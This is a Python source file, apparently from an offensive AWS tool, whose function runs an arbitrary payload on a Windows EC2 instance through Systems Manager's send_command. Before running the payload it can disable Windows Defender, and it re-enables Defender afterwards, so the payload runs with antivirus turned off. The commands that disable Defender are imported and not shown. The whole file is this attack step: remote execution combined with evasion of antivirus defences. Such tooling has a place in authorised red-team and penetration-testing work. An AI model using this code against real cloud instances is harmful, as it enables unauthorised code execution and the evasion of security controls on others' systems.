import time

from src.constants.commands import ENABLE_WINDOWS_DEFENDER, DISABLE_WINDOWS_DEFENDER
from src.helpers.commands import wait_for_command_invocation
from src.helpers.print_output import print_color


def run_windows_command(ssm_client, instance_id, action, payload, disable_av: bool) -> bool:
    """
    Run a Systems Manager command on a running Windows instance.
    It actually calls three commands: Disable windows defender, run the payload, then enable Windows Defender.
    :param ssm_client: The Systems Manager client for the target region
    :param instance_id: Target EC2 instance id
    :param action: Action to be run (AWS calls it DocumentName, here it's running a powershell script)
    :param payload: The actual payload to be executed on the target instance.
    :param disable_av: Disable windows defender or not.
    :return: status of execution
    """
    time.sleep(3)
    # stage1 disable windows defender.
    if disable_av:
        print_color('[..] Disabling Windows Defender momentarily...')
        response = ssm_client.send_command(InstanceIds=[instance_id, ], DocumentName=action, DocumentVersion='$DEFAULT',
                                           TimeoutSeconds=3600, Parameters={
                'commands': [DISABLE_WINDOWS_DEFENDER]})
        command_id = response['Command']['CommandId']
        success, result = wait_for_command_invocation(ssm_client, command_id, instance_id)
        if not success:
            print_color('[!] Could not disable Windows Defender... Stopping command invocation...')
            return False

    # stage2 run payload
    print_color('[..] Running payload...')
    time.sleep(3)
    response = ssm_client.send_command(InstanceIds=[instance_id, ], DocumentName=action,
                                       DocumentVersion='$DEFAULT', TimeoutSeconds=3600,
                                       Parameters={'commands': [payload]})
    command_id = response['Command']['CommandId']
    success, result = wait_for_command_invocation(ssm_client, command_id, instance_id)
    if not success:
        print_color('[!] Could not run payload... Stopping command invocation...')
        return False
    # stage3 enable windows defender.
    if disable_av:
        time.sleep(30)
        print_color('[..] Enabling Windows Defender again....')
        response = ssm_client.send_command(InstanceIds=[instance_id, ], DocumentName=action, DocumentVersion='$DEFAULT',
                                           TimeoutSeconds=3600, Parameters={
                'commands': [ENABLE_WINDOWS_DEFENDER]})
        command_id = response['Command']['CommandId']
        success, result = wait_for_command_invocation(ssm_client, command_id, instance_id)
        if not success:
            print_color('[!] Could not enable Windows Defender... Stopping command invocation...')
            return False
    return True
